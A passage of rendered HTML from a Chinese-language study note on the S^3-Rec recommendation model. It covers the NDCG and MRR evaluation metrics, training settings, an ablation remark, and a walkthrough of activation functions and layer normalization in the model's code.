style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9610050000000003em;\"><span style=\"top:-1.872331em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.050005em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span><span style=\"top:-4.386005em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∣</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.16454285714285719em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mord mtight\">∣</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.277669em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.526108em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mop\"><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.20696799999999996em;\"><span style=\"top:-2.4558600000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.24414em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">i</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.849108em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal mtight\">e</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-left:-0.01968em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.936em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.468912500000001em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<ul>\n<li><strong>rel_i</strong>: 第 i 个推荐项的相关性得分。</li>\n<li><strong>REL_u</strong>: 用户 u 实际喜欢的物品的理想排序。</li>\n<li><strong>DCG@K</strong>: 累积增益，考虑位置的推荐质量。</li>\n<li><strong>IDCG@K</strong>: 理想情况下的累积增益，用于归一化。</li>\n</ul>\n<p>NDCG@K 的值介于 0 和 1 之间，越接近 1 说明推荐系统的排序质量越好。</p>\n<h5 id=\"平均倒数排名mrr\"><a class=\"anchor\" href=\"#平均倒数排名mrr\">#</a> 平均倒数排名（MRR）</h5>\n<p>MRR 衡量推荐系统在推荐列表中第一个相关项的排名。它是排名位置的倒数的平均值。</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi mathvariant=\"normal\">M</mi><mi mathvariant=\"normal\">R</mi><mi mathvariant=\"normal\">R</mi><mo>=</mo><mfrac><mn>1</mn><mrow><mi mathvariant=\"normal\">∣</mi><mi>U</mi><mi mathvariant=\"normal\">∣</mi></mrow></mfrac><munder><mo>∑</mo><mrow><mi>u</mi><mo>∈</mo><mi>U</mi></mrow></munder><mfrac><mn>1</mn><mrow><mi>r</mi><mi>a</mi><mi>n</mi><msub><mi>k</mi><mi>u</mi></msub></mrow></mfrac></mrow><annotation encoding=\"application/x-tex\">\\mathrm M\\mathrm R\\mathrm R=\\frac{1}{|U|}\\sum_{u\\in U}\\frac{1}{rank_u}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathrm\">M</span><span class=\"mord mathrm\">R</span><span class=\"mord mathrm\">R</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.6431459999999998em;vertical-align:-1.321706em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.32144em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mord\">∣</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.936em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.8556639999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">u</span><span class=\"mrel mtight\">∈</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">U</span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.321706em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.32144em;\"><span style=\"top:-2.3139999999999996em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">n</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8360000000000001em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></span></p>\n<ul>\n<li><strong>rank_u</strong>: 对于用户 u，推荐列表中第一个相关项的排名。</li>\n</ul>\n<p><strong>MRR</strong> 的值越高，说明推荐系统越能够将用户感兴趣的物品排在推荐列表的前列。</p>\n<h4 id=\"实验细节\"><a class=\"anchor\" href=\"#实验细节\">#</a> 实验细节</h4>\n<ul>\n<li>对于我们提出的 $ S^3 -Rec$，我们将自注意力块和注意力头的数量设置为 2。嵌入的维度为 64，最大序列长度为 50</li>\n<li>训练阶段包含两个阶段（即预训练和微调阶段）</li>\n<li>在预训练阶段学习到的参数用于在微调阶段初始化我们模型的嵌入层和自注意力层</li>\n<li>在预训练阶段，根据我们的经验实验，项目的掩码比例设置为 0.2，四个损失（即 AAP、MIP、MAP 和 SP）的权重分别设置为 0.2、1.0、1.0 和 0.5</li>\n<li>我们使用 Adam 优化器 [9]，学习率为 0.001</li>\n<li>其中在预训练和微调阶段，批处理大小分别设置为 200 和 256。我们对模型进行了 100 次预训练，并在推荐任务上对其进行了微调。</li>\n</ul>\n<h3 id=\"深入实验\"><a class=\"anchor\" href=\"#深入实验\">#</a> 深入实验</h3>\n<h4 id=\"消融研究\"><a class=\"anchor\" href=\"#消融研究\">#</a> 消融研究</h4>\n<ul>\n<li>删除任何自监督目标都会导致性能下降</li>\n</ul>\n<h1 id=\"代码\"><a class=\"anchor\" href=\"#代码\">#</a> 代码</h1>\n<h2 id=\"modulespy\"><a class=\"anchor\" href=\"#modulespy\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovL21vZHVsZXMucHk=\">modules.py</span></h2>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">gelu</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x * <span class=\"number\">0.5</span> * (<span class=\"number\">1.0</span> + torch.erf(x / math.sqrt(<span class=\"number\">2.0</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">swish</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x * torch.sigmoid(x)</span><br><span class=\"line\"></span><br><span class=\"line\">ACT2FN = &#123;<span class=\"string\">&quot;gelu&quot;</span>: gelu, <span class=\"string\">&quot;relu&quot;</span>: F.relu, <span class=\"string\">&quot;swish&quot;</span>: swish&#125;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>\n<p>均为激活函数</p>\n</li>\n<li>\n<p><code>gelu</code>  函数<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi><mo>⋅</mo><mn>0.5</mn><mo>⋅</mo><mo stretchy=\"false\">(</mo><mn>1.0</mn><mo>+</mo><mi>e</mi><mi>r</mi><mi>f</mi><mo stretchy=\"false\">(</mo><mfrac><mi>x</mi><msqrt><mn>2.0</mn></msqrt></mfrac><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">x⋅0.5⋅(1.0+erf(\\frac x {\\sqrt  {2.0} }))</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.44445em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.2879999999999998em;vertical-align:-0.5379999999999999em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.695392em;\"><span style=\"top:-2.5510085em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord sqrt mtight\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.912845em;\"><span class=\"svg-align\" style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mtight\" style=\"padding-left:0.833em;\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\">.</span><span class=\"mord mtight\">0</span></span></span><span style=\"top:-2.872845em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"hide-tail mtight\" style=\"min-width:0.853em;height:1.08em;\"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702\nc-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14\nc0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54\nc44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10\ns173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429\nc69,-144,104.5,-217.7,106.5,-221\nl0 -0\nc5.3,-9.3,12,-14,20,-14\nH400000v40H845.2724\ns-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7\nc-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z\nM834 80h400000v40h-400000z'/></svg></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.12715500000000002em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.394em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">x</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.5379999999999999em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mclose\">)</span><span class=\"mclose\">)</span></span></span></span></p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi mathvariant=\"normal\">erf</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mfrac><mn>2</mn><msqrt><mi>π</mi></msqrt></mfrac><msubsup><mo>∫</mo><mn>0</mn><mi>x</mi></msubsup><msup><mi>e</mi><mrow><mo>−</mo><msup><mi>t</mi><mn>2</mn></msup></mrow></msup><mi>d</mi><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">\\operatorname{erf}(x)=\\frac{2}{\\sqrt{\\pi}}\\int_0^xe^{-t^2} dt\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mop\"><span class=\"mord mathrm\">e</span><span class=\"mord mathrm\">r</span><span class=\"mord mathrm\" style=\"margin-right:0.07778em;\">f</span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.3442920000000003em;vertical-align:-0.9300000000000002em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.32144em;\"><span style=\"top:-2.30972em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord sqrt\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8002800000000001em;\"><span class=\"svg-align\" style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\" style=\"padding-left:0.833em;\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span></span></span><span style=\"top:-2.76028em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"hide-tail\" style=\"min-width:0.853em;height:1.08em;\"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702\nc-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14\nc0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54\nc44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10\ns173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429\nc69,-144,104.5,-217.7,106.5,-221\nl0 -0\nc5.3,-9.3,12,-14,20,-14\nH400000v40H845.2724\ns-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7\nc-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z\nM834 80h400000v40h-400000z'/></svg></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.23972em;\"><span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9300000000000002em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\"><span class=\"mop op-symbol large-op\" style=\"margin-right:0.44445em;position:relative;top:-0.0011249999999999316em;\">∫</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.414292em;\"><span style=\"top:-1.7880500000000001em;margin-left:-0.44445em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span><span style=\"top:-3.8129000000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">x</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9119499999999999em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0369199999999998em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913142857142857em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">t</span></span></span></span></span></p>\n<ul>\n<li>误差函数</li>\n</ul>\n</li>\n<li>\n<p><code>swish</code>  函数<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi><mo>⋅</mo><mi>σ</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">x⋅σ(x)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.44445em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span></p>\n</li>\n</ul>\n<h3 id=\"层归一化\"><a class=\"anchor\" href=\"#层归一化\">#</a> 层归一化</h3>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left right\" columnspacing=\"0em 1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>1.计算均值:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mi>μ</mi><mo>=</mo><mfrac><mn>1</mn><mi>D</mi></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>D</mi></munderover><msub><mi>x</mi><mi>i</mi></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>2. 计算方差:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><msup><mi>σ</mi><mn>2</mn></msup><mo>=</mo><mfrac><mn>1</mn><mi>D</mi></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>D</mi></munderover><mo stretchy=\"false\">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>−</mo><mi>μ</mi><msup><mo stretchy=\"false\">)</mo><mn>2</mn></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>3. 归一化:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><msub><mover accent=\"true\"><mi>x</mi><mo>^</mo></mover><mi>i</mi></msub><mo>=</mo><mfrac><mrow><msub><mi>x</mi><mi>i</mi></msub><mo>−</mo><mi>μ</mi></mrow><msqrt><mrow><msup><mi>σ</mi><mn>2</mn></msup><mo>+</mo><mi>ϵ</mi></mrow></msqrt></mfrac></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>其中</mtext><mo separator=\"true\">,</mo><mi>ϵ</mi><mtext>是一个小常数</mtext><mo separator=\"true\">,</mo><mtext>用于防止除以零。</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>4缩放和平移:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><mi>γ</mi><msub><mover accent=\"true\"><mi>x</mi><mo>^</mo></mover><mi>i</mi></msub><mo>+</mo><mi>β</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>其中</mtext><mo separator=\"true\">,</mo><mi>γ</mi><mtext>和</mtext><mi>β</mi><mtext>是可学习的参数</mtext><mo separator=\"true\">,</mo><mtext>分别用于缩放和平移。</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;\\text{1.计算均值:} \\\\\n&amp;&amp;\\mu=\\frac{1}{D}\\sum_{i=1}^{D}x_{i} \\\\\n&amp;\\text{2. 计算方差:} \\\\\n&amp;&amp; \\sigma^{2}=\\frac{1}{D}\\sum_{i=1}^{D}(x_{i}-\\mu)^{2} \\\\\n&amp;\\text{3. 归一化:} 